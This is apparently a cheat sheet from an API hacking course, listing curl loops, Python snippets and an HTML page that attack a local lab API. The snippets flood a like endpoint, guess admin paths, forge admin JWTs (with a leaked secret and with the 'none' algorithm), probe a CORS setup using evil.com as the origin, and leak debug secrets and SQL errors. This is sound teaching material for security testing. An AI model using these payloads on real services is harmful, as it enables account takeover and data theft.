# 🗂️ Cheat Sheet — Stage 5: OWASP Top 10 (Part 2)

## API4:2023 — No Rate Limiting

```bash
# Rapid-fire likes (race condition / like bombing)
for i in {1..20}; do
  curl -s -X POST http://localhost:5001/api/v1/posts/1/like \
    -H "Authorization: Bearer $TOKEN" & 
done; wait

# Parallel requests with xargs
seq 1 50 | xargs -P 10 -I{} curl -s -X POST http://localhost:5001/api/v1/posts/1/like \
  -H "Authorization: Bearer $TOKEN"
```

## API5:2023 — Broken Function Level Authorization (BFLA)

```bash
# Common admin path guesses
for p in admin admin/users admin/stats admin/settings admin/config internal/users management/users; do
  curl -s -o /dev/null -w "%{http_code} $p\n" http://localhost:5001/api/v1/$p \
    -H "Authorization: Bearer $TOKEN"
done
```

```python
# Forge admin JWT (after leaking secret from /api/v1/debug)
import jwt, time
token = jwt.encode({"user_id": 1, "role": "admin",
                     "iat": int(time.time()), "exp": int(time.time())+86400},
                    JWT_SECRET, algorithm="HS256")
```

## API8:2023 — Security Misconfiguration (CORS)

```bash
# Reflect-origin CORS test
curl -s -I http://localhost:5001/api/v1/users/1 \
  -H "Origin: http://evil.com" | grep -i access-control

# Should NOT reflect arbitrary origins with credentials=true — if it does, vulnerable
```

```html
<!-- Local PoC page to test CORS exploitation (host on any localhost port) -->
<script>
fetch("http://localhost:5001/api/v1/users/1", {credentials: "include"})
  .then(r => r.json()).then(d => console.log(d));
</script>
```

## Information Disclosure Quick Checks

```bash
curl -s http://localhost:5001/api/v1/debug | jq '.jwt_secret, .database_uri'
curl -s http://localhost:5001/ | jq '.debug_mode, .database'
curl -s -X POST http://localhost:5001/api/v1/users/search -d '{"q":"'"'"'"}' \
  -H "Content-Type: application/json"   # SQL error message leak
```

## JWT "none" Algorithm PoC

```python
import base64, json
header = {"alg": "none", "typ": "JWT"}
payload = {"user_id": 1, "role": "admin", "exp": 9999999999}
h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
none_token = f"{h}.{p}."
```

---
*SocialHack API Hacking Course — Stage 5 Cheat Sheet*
